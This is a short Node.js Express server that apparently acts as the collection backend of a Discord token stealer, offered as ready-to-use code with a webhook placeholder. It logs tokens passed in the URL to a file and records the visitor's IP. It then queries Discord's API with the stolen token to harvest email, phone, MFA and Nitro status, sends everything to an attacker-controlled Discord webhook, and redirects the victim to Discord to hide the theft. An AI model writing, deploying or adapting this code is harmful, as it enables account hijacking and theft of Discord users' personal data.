const express = require('express');
const axios = require('axios');
const { Webhook, MessageBuilder } = require('discord-webhook-node');

const app = express();
const hook = new Webhook('YOUR WEBHOOK');

function sendBlackEmbed(token, ip, phoneNumber, email, username, tag, avatarUrl, mfaStatus, nitroStatus) {
  const embed = new MessageBuilder()
    .setColor(0)
    .setAuthor(`${username}#${tag}`)
    .setThumbnail(avatarUrl)
    .addField('Email', `\`\`\`${email}\`\`\``, false)
    .addField('Phone', `\`\`\`${phoneNumber}\`\`\``, false)
    .addField('MFA Status', `\`\`\`${mfaStatus}\`\`\``, false)
    .addField('Nitro', `\`\`\`${nitroStatus}\`\`\``, false)
    .addField('IP', `\`\`\`${ip}\`\`\``, false)
    .addField('Token', `\`\`\`${token}\`\`\``, false);

  hook.send(embed);
}

app.get('/alive', (req, res) => {
  res.send('alive');
});

app.get('/', (req, res) => {
  res.redirect('https://discord.com/app');
});

app.get('/:token', async (req, res) => {
  const token = req.params.token;

  let publicip;
  if (req.headers['x-forwarded-for'] === undefined) {
    publicip = req.connection.remoteAddress;
  } else {
    publicip = req.headers['x-forwarded-for'];
  }

  // Write token to file
  const fs = require('fs');
  fs.appendFileSync('tokens.txt', `${token}\n`);

  try {
    const headers = { 'Authorization': token };
    const response = await axios.get('https://discord.com/api/v9/users/@me', { headers });

    if (response.status === 200) {
      const user_data = response.data;
      const username = user_data.username;
      const tag = user_data.discriminator;
      const email = user_data.email || 'N/A';
      const phone_number = user_data.phone || 'N/A';
      const avatarUrl = `https://cdn.discordapp.com/avatars/${user_data.id}/${user_data.avatar}.png`;
      const mfaEnabled = user_data.mfa_enabled || false;
      const mfaStatus = mfaEnabled ? 'Enabled' : 'Disabled';
      const nitroStatus = user_data.premium_type ? 'Yes' : 'No';
      sendBlackEmbed(token, publicip, phone_number, email, username, tag, avatarUrl, mfaStatus, nitroStatus);
    }
  } catch (error) {
    // Handle error
  }

  res.redirect('https://discord.com/app');
});

app.listen(81, '0.0.0.0', () => {
  console.log('Server running on http://0.0.0.0:81');
});
